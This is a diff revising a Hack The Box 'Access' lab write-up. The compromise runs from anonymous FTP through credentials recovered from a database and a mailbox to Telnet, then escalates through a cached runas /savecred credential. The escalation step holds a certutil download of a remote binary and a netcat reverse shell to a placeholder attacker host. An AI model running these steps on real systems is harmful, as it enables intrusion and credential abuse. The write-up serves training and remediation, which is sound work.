@@ -13,118 +13,152 @@ tags:
   - ftp
   - telnet
   - credential-manager
+objective: "Escalate from anonymously exposed legacy services to administrative control without exploiting a single CVE."
+tools:
+  - nmap
+  - ftp
+  - mdbtools
+  - 7z
+  - pst-utils
+  - telnet
+  - netcat
+  - cmdkey
+  - certutil
+  - runas
+skill: "Credential discovery and abuse across legacy Windows services"
+outcome: "Telnet user access and Administrator command execution via cached runas /savecred credentials"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Windows Server 2008 R2 (build 6.1.7600, end-of-life) |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from anonymously exposed legacy services to administrative control without exploiting a single CVE |
+| Outcome | User-level Telnet shell; Administrator command execution via cached credentials |
 
 ## Summary
 
-Access is an Easy-rated Hack The Box Windows lab that demonstrates how sensitive data on misconfigured legacy services leads to full compromise without exploiting a single CVE. The recorded chain starts at anonymous FTP, recovers credentials from a database and an archived mailbox, gains user access over Telnet, then escalates via a cached `runas /savecred` credential. Every step abuses legitimate functionality that was misconfigured. Credential values, target addresses, and download locations are redacted below; command patterns are preserved.
+Access is an Easy-rated Hack The Box Windows lab that reaches full administrative compromise without exploiting a single CVE by chaining misconfigured legacy services and stored credentials. Anonymous FTP exposes a Microsoft Access database and an encrypted ZIP archive; the database holds the archive password, the archive contains a mailbox that discloses Telnet credentials, and a cached `runas /savecred` credential turns a low-privileged shell into Administrator execution. Credential values, target and attacker addresses, and download locations are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Anonymous FTP → database credential recovery → encrypted archive → mailbox credential disclosure → Telnet access → cached `runas /savecred` abuse → Administrator**
 
 ## Context and Objective
 
-- **Target:** Windows Server 2008 R2 (build 6.1.7600, end-of-life)
-- **Services exposed:** FTP (port 21), Telnet (port 23), HTTP/IIS 7.5 (port 80)
-- **Objective:** Achieve full compromise through the attack surface presented by the exposed services
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** Windows Server 2008 R2, build 6.1.7600 — an end-of-life host outside Microsoft support.
+- **Exposed services:** FTP (21), Telnet (23), and HTTP/IIS 7.5 (80).
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** move from anonymous legacy-service access to user and administrative control, and demonstrate the impact of credential sprawl across those services.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
 ### 1. Service Enumeration
 
-Observation: three open TCP services with distinct attack surfaces. FTP allows anonymous login. Telnet leaks NTLM/machine details. HTTP serves an IIS page consistent with an older Windows build.
-
-Action: full TCP scan, then targeted version/script scan of ports 21, 23, 80.
+Observation: a full TCP scan exposes three services with distinct attack surfaces.
 
 ```bash
 nmap -sT -p- --min-rate 5000 -oA <OUT_PREFIX> <TARGET_IP>
 nmap -sC -sV -p 21,23,80 -oA <OUT_PREFIX> <TARGET_IP>
 ```
 
-Representative excerpt (truncated):
+Truncated scan output:
 
 ```text
-21/tcp open ftp    Microsoft ftpd — Anonymous FTP login allowed
-23/tcp open telnet Microsoft Windows telnetd — NTLM info leaks machine identity, build 6.1.7600
-80/tcp open http   Microsoft-IIS/7.5 — page title MegaCorp, potentially risky TRACE method
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+23/tcp open  telnet  Microsoft Windows XP telnetd
+|_  Product_Version: 6.1.7600
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-title: MegaCorp
+| http-methods:
+|_  Potentially risky methods: TRACE
 ```
 
-Technical significance: anonymous FTP is immediately actionable. Telnet is the only interactive shell service, so any recovered credential becomes directly useful. The leaked build (6.1.7600, Server 2008 R2 RTM) signals an end-of-life, likely unpatched host. HTTP is enumeration-only here; the notes do not use it for exploitation.
+Significance: anonymous FTP is immediately actionable; Telnet is the only interactive shell service, so any recovered credential becomes directly usable; the leaked build (6.1.7600) identifies an end-of-life host.
 
-Result: the recorded output shows FTP, Telnet, and IIS exposed on an EOL Windows host.
+Result: FTP, Telnet, and IIS are exposed on an out-of-support Windows host, and anonymous FTP access is confirmed.
 
-### 2. Anonymous FTP — Data Exfiltration
+### 2. Anonymous FTP Access
 
-Observation: two directories with one sensitive file each.
-
-Action: anonymous login, list directories, transfer both files in binary mode. The source notes binary transfer mode before retrieving files; it does not evidence an actual passive/active failure or fix, so none is claimed.
+Observation: the FTP service allows anonymous login and exposes two directories with one sensitive file each.
 
 ```bash
 ftp <TARGET_IP>
-# user: anonymous
-ftp> ls
-# Backups/   Engineer/
-ftp> cd Backups
+# Name: anonymous
+# Password: (any string / blank)
+ftp> type binary
 ftp> get backup.mdb
-ftp> cd ../Engineer
 ftp> get "Access Control.zip"
 ```
 
-Representative listing (structure only):
+Directory listing:
 
 ```text
-Backups/  -> backup.mdb
-Engineer/ -> Access Control.zip  (password-protected)
+Backups/:
+08-23-18  09:16PM      5652480  backup.mdb
+
+Engineer/:
+08-24-18  01:16AM        10870  Access Control.zip
 ```
 
-Result: the notes report both files retrieved for offline analysis.
+Significance: both files are retrievable without authentication. `backup.mdb` is a Microsoft Access database; `Access Control.zip` is password-protected.
 
-### 3. Database Analysis — Credential Recovery
+Result: the session yields a database and an encrypted archive for offline analysis.
 
-Observation: `backup.mdb` is a Microsoft Jet 4.0 database. Linux `mdbtools` reads it without Microsoft Office.
+### 3. Database Credential Recovery
 
-Action: list tables, count rows per table, dump the non-empty `auth_user` table.
+Observation: `backup.mdb` is a Microsoft Jet 4.0 database; the `mdbtools` suite reads it on Linux without Microsoft Office.
 
 ```bash
-mdb-tables <DB_FILE>
-for t in $(mdb-tables <DB_FILE>); do mdb-count <DB_FILE> "$t"; done
-mdb-export <DB_FILE> auth_user
+mdb-tables backup.mdb
+for table in $(mdb-tables backup.mdb); do mdb-count backup.mdb "$table"; done
+mdb-export backup.mdb auth_user
 ```
 
-Representative excerpt (schema only, values redacted):
+The `auth_user` export returns three rows (identifiers and passwords redacted):
 
 ```text
 id,username,password,Status,last_login,RoleID,Remark
-<3 rows returned — credential values redacted>
+25,<LAB_USER_1>,<PASSWORD_1>,1,"08/23/18 21:11:47",26,
+27,<LAB_USER_2>,<PASSWORD_2>,1,"08/23/18 21:13:36",26,
+28,<LAB_USER_3>,<PASSWORD_1>,1,"08/23/18 21:14:02",26,
 ```
 
-Technical significance: the table stores passwords in plaintext. One database-derived password unlocks the ZIP archive in the next stage (source-reported success).
+Significance: the table stores account passwords in plaintext. One of those values unlocks the archive in the next stage, so the same secret crosses from the database into the encrypted archive.
 
-Result: the notes report three stored credential pairs; one is reused against the encrypted archive.
+Result: three stored credential pairs are recovered; one is reused successfully against the archive.
 
-### 4. Archive Extraction — Email Forensics
+### 4. Archive Extraction and Mailbox Forensics
 
-Observation: password-protected ZIP containing an Outlook Personal Storage Table (`.pst`).
-
-Action: extract with an archive tool that handles the compression method, then convert the mailbox on Linux.
+Observation: the ZIP unlocks with a database-derived password and contains an Outlook Personal Storage Table (`.pst`).
 
 ```bash
-7z x "<ARCHIVE_FILE>"
-# password prompt -> <ARCHIVE_PASSWORD> (redacted, database-derived)
-sudo apt install pst-utils
-readpst -D -r "<MAILBOX_FILE>"
-cat "<MAILBOX_MBOX>"
+7z x "Access Control.zip"
+# password prompt -> <ARCHIVE_PASSWORD> (database-derived, redacted)
+readpst -D -r "Access Control.pst"
+cat "Access Control.mbox"
 ```
 
-Note: the source reports the standard `unzip` utility may fail on this archive's compression method while `7z` succeeds. No failure narrative beyond that is claimed.
+The converted mailbox discloses a credential pair (password redacted):
 
-Technical significance: PST files bundle mail, calendar, and contacts. Converting to mbox makes the message body searchable. The converted mail discloses valid Telnet credentials for a low-privileged service account (values redacted; source-reported).
+```text
+From: <SENDER>@<MAIL_DOMAIN>
+To: <RECIPIENT>@<MAIL_DOMAIN>
+Subject: MegaCorp Access Control System account
 
-Result: the notes report archive unlocked with the database-derived password and Telnet credentials recovered from mail.
+The password for the <LAB_USER> account has been changed to <LAB_USER_PASSWORD>.
+```
 
-### 5. Telnet — Initial Access
+Significance: exported mail is a common home for credential disclosures; converting the PST to mbox makes message bodies searchable, and this one yields credentials for the exposed Telnet service.
 
-Observation: cleartext legacy shell service; recovered credentials fit it directly.
+Result: the archive is unlocked with the database-derived password, and the mailbox yields a low-privileged credential pair that is subsequently validated through Telnet. Some `unzip` builds may not handle this compression method; `7z` does.
 
-Action: authenticate over Telnet with the mailbox-derived credential.
+### 5. Telnet Initial Access
+
+Observation: Telnet is the only interactive shell service, and the recovered credential fits it directly.
 
 ```bash
 telnet <TARGET_IP>
@@ -132,58 +166,62 @@ telnet <TARGET_IP>
 # password: <LAB_USER_PASSWORD>
 ```
 
-Representative excerpt:
+Authentication returns a shell:
 
 ```text
 Welcome to Microsoft Telnet Server.
 C:\Users\<LAB_USER>>
 ```
 
-Technical significance: Telnet transmits everything in cleartext. The shell works but lacks control sequences and is unstable, so the source recommends upgrading to a PowerShell-based reverse shell served over HTTP. That upgrade is a recommendation only; the notes do not evidence it performed.
+Significance: Telnet carries credentials and session data in cleartext. The shell lacks support for certain control sequences and is unstable, so upgrading to a PowerShell-based reverse shell served over HTTP is presented as the next step; it is a recommendation, not an action the evidence shows performed.
 
-Result: the notes report a user-level shell and user flag on the user desktop (flag content omitted).
+Result: an authenticated user-level shell is obtained on the target.
 
 ### 6. Post-Exploitation Enumeration — Cached Credential Discovery
 
-Observation: security-application shortcut on the Public desktop.
-
-Action: list the desktop, read the shortcut's target and arguments via the `WScript.Shell` COM object, then check the credential store.
+Observation: a security-application shortcut on the Public desktop points to `runas.exe`.
 
 ```cmd
-dir <PUBLIC_DESKTOP>
+dir C:\Users\Public\Desktop\
+# ZKAccess3.5 Security System.lnk   1,870 bytes
 ```
 
 ```powershell
-$Wsh = New-Object -ComObject WScript.Shell
-$sc = Get-Item "<PUBLIC_DESKTOP>\<APP_NAME>.lnk"
-$Wsh.CreateShortcut($sc)
+$WScript = New-Object -ComObject WScript.Shell
+$SC = Get-Item "C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk"
+$WScript.CreateShortcut($SC)
 ```
 
-Representative excerpt (identifiers generalized):
+The shortcut resolves to a saved-credential invocation:
 
 ```text
-TargetPath : C:\Windows\System32\runas.exe
-Arguments  : /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "<APP_PATH>"
+TargetPath  : C:\Windows\System32\runas.exe
+Arguments   : /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
 ```
+
+The credential store confirms the cache:
 
 ```cmd
 cmdkey /list
 ```
 
 ```text
-Target: Domain:interactive=<DOMAIN>\<ADMIN_ACCOUNT>
-Type:   Domain Password
+Currently stored credentials:
+
+  Target: Domain:interactive=<DOMAIN>\<ADMIN_ACCOUNT>
+  Type: Domain Password
+  User: <DOMAIN>\<ADMIN_ACCOUNT>
 ```
 
-Technical significance: `/savecred` caches the credential in Credential Manager after first successful use. Any process in the same user context can then invoke `runas /savecred` without a password prompt. The cache persists until explicitly removed.
+Significance: `/savecred` causes Windows to cache the credential in Credential Manager after a first successful use, so later `runas /savecred` calls as the same user run without a password prompt. Any process in that user's context can reuse the entry until it is removed.
 
-Result: the recorded output shows the elevated account's domain password cached in the store.
+Result: a saved credential entry exists for the administrative account, confirming the shortcut was used previously.
 
-### 7. Privilege Escalation — Credential Manager Abuse
+### 7. Privilege Escalation — Cached Credential Abuse
 
-Observation: cached elevated credential + arbitrary command execution as the low-privileged user equals escalation path.
+Observation: a cached Administrator credential plus the ability to run commands as the low-privileged user completes the path.
 
-Action (patterns only, locations redacted): stage a shell binary, listen on the attack host, execute it under the cached credential. A direct file-read alternative avoids the shell.
+Action, shown as placeholder patterns (download specifics summarized, not literal):
 
 ```cmd
 certutil -urlcache -split -f <REMOTE_BINARY> <LOCAL_STAGING_PATH>
@@ -197,49 +235,50 @@ nc -lvnp <LISTEN_PORT>
 runas /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "<LOCAL_STAGING_PATH> -e cmd.exe <ATTACKER_HOST> <LISTEN_PORT>"
 ```
 
-Direct-read alternative (pattern only):
+The shell returns in the Administrator context:
 
-```cmd
-runas /user:<DOMAIN>\<ADMIN_ACCOUNT> /savecred "cmd /c type <ADMIN_DESKTOP>\root.txt > <STAGING_OUT>"
-type <STAGING_OUT>
+```text
+connect to [<ATTACKER_HOST>] from (UNKNOWN) [<TARGET_IP>] <SOURCE_PORT>
+Microsoft Windows [Version 6.1.7600]
+C:\Windows\system32>whoami
+<DOMAIN>\<ADMIN_ACCOUNT>
 ```
 
-Download details and encoded payloads are intentionally omitted as weaponized chains; the technique category and command roles are preserved.
+Significance: the cached credential lets any same-user process execute as Administrator without the password, turning a stale saved credential into full command execution.
 
-Result: the notes report an elevated shell (`whoami` returns the administrator context) and root flag on the administrator desktop. Both are source-reported without independent output confirmation in the available evidence.
+Result: the privileged `whoami` output confirms execution in the Administrator context.
 
 ## Challenges and Decisions
 
 | Challenge | Decision | Rationale |
 |---|---|---|
-| Encrypted ZIP archive | Used archive tool handling its compression method | Extracted mailbox file for analysis |
-| Telnet shell instability | Notes recommend PowerShell-based reverse shell upgrade | Telnet lacks support for certain control sequences; recommendation only, not evidenced as performed |
-| No exploitation of a single CVE | Followed data chain from FTP archives to Telnet credentials | Legitimate functionality abuse required no patch circumvention |
-
-FTP transfer-mode note: binary mode used for retrieval. No passive/active failure or fix claimed.
+| Telnet shell lacks control sequences and is unstable | Upgrade to a PowerShell-based reverse shell over HTTP is recommended | More stable interactive session |
+| No single CVE to exploit | Followed the data and credential chain | Misconfigured legitimate services provided access without patch circumvention |
 
 ## Outcome
 
-The evidence establishes: user-level access via Telnet credential recovery from FTP-hosted database and mailbox material; elevated access via cached `runas /savecred` credential abuse. Reverse-shell establishment, mailbox conversion output, and flag acquisition are source-reported with the limitations noted above. HTTP played an enumeration-only role.
-
-**Attack chain:**
-Anonymous FTP → database mining → archive extraction → email forensics → Telnet login → cached credential abuse → elevated-privilege shell
+The evidence establishes user-level access over Telnet using credentials recovered from anonymously reachable FTP data, and administrative command execution through a credential cached by `runas /savecred` — the privileged `whoami` output confirms the escalated context. HTTP was enumeration-only.
 
 ## Lessons and Recommendations
 
-Recommendations below follow the source remediation; none were re-tested during curation.
+The actions below are recommendations; none was validated in the lab.
 
-1. **Disable anonymous FTP access.** Require authentication. Never place credential-bearing exports or archived backups in FTP-reachable directories. Prefer SFTP. (Recommendation.)
-2. **Replace Telnet with SSH.** Telnet exposes credentials and session data in cleartext to any network observer. OpenSSH provides equivalent access with encryption. (Recommendation.)
-3. **Audit Credential Manager regularly.** `/savecred` entries persist until deleted. Disable storage via Group Policy (`Network access: Do not allow storage of passwords and credentials for network authentication`) where viable. Never cache privileged credentials in user-accessible stores. (Recommendation.)
-4. **Protect sensitive data from anonymous-accessible services.** Plaintext database credentials unlocked an archive; archived mail yielded distinct shell credentials. Keep secrets out of anonymously reachable shares. (Lesson grounded in this chain.)
-5. **Remove stale cached credentials.** Same-user processes reuse them without a prompt. Treat any `/savecred` use with privileged accounts as a finding. (Lesson grounded in this escalation.)
+Each finding below pairs the observed root cause with its demonstrated impact and a prioritized action.
 
-Editorial MITRE view (mapping only, not a source claim): valid-account logon over a cleartext remote service; credentials in files and mailbox stores; credential-manager cache abuse for privilege escalation.
+1. **Anonymous FTP exposure.** Anonymous access let an unauthenticated party retrieve a database and an archived mailbox. *Recommendation:* require authentication, keep credential-bearing exports out of reachable directories, and replace FTP with an encrypted protocol such as SFTP. *Detection:* alert on anonymous FTP logins and on transfers of backup or export artifacts.
+2. **Plaintext credentials in stored data.** The Access database stored passwords in cleartext and a mail archive disclosed another credential, enabling the archive unlock and the Telnet login. *Recommendation:* never store reusable credentials in databases or mailbox archives, and scan exports and backups for secrets before sharing them.
+3. **Cleartext Telnet.** Telnet transmits credentials and session data in cleartext, so a recovered credential immediately yields a usable shell. *Recommendation:* retire Telnet in favor of SSH and disable the legacy service.
+4. **Cached privileged credentials.** A `runas /savecred` entry persisted in Credential Manager, letting same-user processes run as Administrator without the password. *Recommendation:* audit and clear stored credentials with `cmdkey`, and disable saved-credential storage through Group Policy (`Network access: Do not allow storage of passwords and credentials for network authentication`). *Detection:* treat `runas /savecred` use with privileged accounts as a finding to investigate.
 
 ## References
 
-- Hack The Box machine **[Access](https://app.hackthebox.com/machines/Access)** (retired lab; no active-instance detail)
-- Microsoft documentation: Windows Credential Manager and saved-credentials features
-- `mdbtools` suite for Microsoft Access database inspection on Linux
-- `pst-utils` package for Outlook PST file conversion
+- [Hack The Box — Access](https://app.hackthebox.com/machines/Access) (retired machine)
+- [Windows Server 2008 R2 — Microsoft Lifecycle](https://learn.microsoft.com/en-us/lifecycle/products/windows-server-2008-r2)
+- [telnet — Windows Commands (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/telnet)
+- [Network access: Do not allow storage of passwords and credentials for network authentication (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-do-not-allow-storage-of-passwords-and-credentials-for-network-authentication)
+- [runas — Windows Commands (Microsoft Learn)](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)>)
+- [cmdkey — Windows Commands (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
+- [MDB Tools (`mdbtools`)](https://github.com/mdbtools/mdbtools)
+- [libpst — `readpst`](https://www.five-ten-sg.com/libpst/)
+- [7-Zip](https://7-zip.org/)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
